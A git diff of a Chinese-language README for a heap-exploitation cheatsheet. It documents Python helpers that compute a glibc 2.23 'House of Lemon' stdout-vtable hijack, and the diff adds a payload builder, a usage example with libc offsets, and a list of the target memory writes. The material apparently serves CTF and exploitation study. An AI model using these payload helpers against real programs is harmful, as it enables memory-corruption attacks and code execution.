@@ -74,7 +74,12 @@ cd heap_ultimate_cheatsheet
 
 ## Python 离线板子
 
-[`lemon.py`](./lemon.py) 提供 `build_house_of_lemon`，计算已验证 2.23 布局的越界 fastbin 投递参数。
+[`lemon.py`](./lemon.py) 提供两个函数：
+
+```text
+build_house_of_lemon         -> 返回 LemonPlan
+build_house_of_lemon_payload -> 返回 global_max_fast（可选）和 stdout vtable 槽写入
+```
 
 ### 函数用途
 
@@ -93,17 +98,26 @@ Lemon 是 2.23 标准流劫持链：
 ### 最小使用示例
 
 ```python
-from lemon import build_house_of_lemon
+from lemon import build_house_of_lemon, build_house_of_lemon_payload
 
 plan = build_house_of_lemon(
-    stdout_addr=0x7fff4000,          # _IO_2_1_stdout_
-    main_arena_addr=0x7fff3000,      # 已泄露 main_arena
+    stdout_addr=0x3c4620,            # _IO_2_1_stdout_
+    main_arena_addr=0x3c3b20,        # 已泄露 main_arena
     fake_chunk_header_addr=0x5555000,# fake chunk header
 )
 
 # 返回 LemonPlan
 print(hex(plan.request_size), hex(plan.chunk_size),
       hex(plan.fastbin_index), hex(plan.stdout_vtable_addr))
+
+writes = build_house_of_lemon_payload(
+    stdout_addr=0x3c4620,
+    main_arena_addr=0x3c3b20,
+    fake_chunk_header_addr=0x5555000,
+    global_max_fast_addr=0x3c67f8,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
 
 ### 对应 PoC
@@ -141,6 +155,18 @@ request      = chunk_size - 0x10
 | `fake_vtable_addr` | 传入的 fake chunk header 地址。 |
 
 若地址关系不满足 `chunk_size == 0x17c0`，函数会直接拒绝。
+
+### 返回对象 `MemoryWrite`
+
+`build_house_of_lemon_payload` 返回一到两项写入：
+
+```text
+1. global_max_fast_addr -> global_max_fast
+   仅当调用者传入 global_max_fast_addr 时生成。
+
+2. stdout_addr + 0xd8 -> fake_chunk_header_addr
+   表示越界 fastbin free 对 stdout vtable 槽造成的目标写入效果。
+```
 
 ### 调用者必须提供
 
